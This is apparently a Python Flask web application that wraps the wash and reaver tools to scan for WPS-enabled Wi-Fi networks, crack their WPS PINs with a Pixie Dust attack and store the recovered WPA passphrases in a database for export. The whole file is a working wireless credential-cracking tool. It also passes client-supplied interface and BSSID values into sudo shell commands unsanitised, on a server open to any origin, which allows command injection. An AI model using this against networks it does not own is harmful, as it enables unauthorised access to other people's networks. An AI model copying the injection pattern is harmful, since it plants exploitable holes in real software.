import os
import subprocess
import threading
import sqlite3
import re
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'wps_secure_key'
socketio = SocketIO(app, cors_allowed_origins="*")

DB_FILE = "wps_results.db"

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS cracked_wps 
                        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                         ssid TEXT, bssid TEXT, pin TEXT, psk TEXT, 
                         date DATETIME DEFAULT CURRENT_TIMESTAMP)''')

def save_result(ssid, bssid, pin, psk):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO cracked_wps (ssid, bssid, pin, psk) VALUES (?, ?, ?, ?)", 
                     (ssid, bssid, pin, psk))

def run_command(command, bssid_target=None):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    found_pin, found_psk, found_ssid = None, None, "Unknown"
    for line in iter(process.stdout.readline, ""):
        socketio.emit('terminal_output', {'data': line})
        if "WPS PIN:" in line: found_pin = line.split(":")[-1].strip()
        if "WPA PSK:" in line: found_psk = line.split(":")[-1].strip()
        if "AP SSID:" in line: found_ssid = line.split(":")[-1].strip()
        if found_pin and found_psk:
            save_result(found_ssid, bssid_target or "N/A", found_pin, found_psk)
            socketio.emit('terminal_output', {'data': '\n[!] SUKSES: Data disimpan ke database.\n'})
            found_pin, found_psk = None, None
    process.stdout.close()
    process.wait()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_interfaces')
def get_interfaces():
    try:
        result = subprocess.check_output("iw dev | grep Interface", shell=True).decode()
        return jsonify(re.findall(r"Interface\s+(.*)", result))
    except:
        return jsonify(["wlan0"])

@app.route('/history')
def get_history():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute("SELECT * FROM cracked_wps ORDER BY date DESC")
        return jsonify(cursor.fetchall())

@app.route('/export')
def export_txt():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute("SELECT ssid, bssid, pin, psk, date FROM cracked_wps")
        data = cursor.fetchall()
    
    file_path = "wps_cracked_results.txt"
    with open(file_path, "w") as f:
        f.write("HASIL PENGUJIAN WPS WPA TESTER\n" + "="*30 + "\n")
        for row in data:
            f.write(f"SSID: {row[0]}\nBSSID: {row[1]}\nPIN: {row[2]}\nPSK: {row[3]}\nDate: {row[4]}\n" + "-"*20 + "\n")
    
    return send_file(file_path, as_attachment=True)

@app.route('/stop')
def stop_all():
    os.system("sudo pkill reaver")
    os.system("sudo pkill wash")
    return jsonify({"status": "Stopped"})

@socketio.on('start_scan')
def handle_scan(data):
    iface = data.get('interface', 'wlan0')
    threading.Thread(target=run_command, args=(f"sudo wash -i {iface} -n 30",)).start()

@socketio.on('start_attack')
def handle_attack(data):
    bssid, iface = data['bssid'], data['interface']
    cmd = f"sudo reaver -i {iface} -b {bssid} -K 1 -vv"
    threading.Thread(target=run_command, args=(cmd, bssid)).start()

if __name__ == '__main__':
    init_db()
    socketio.run(app, host='0.0.0.0', port=5000)
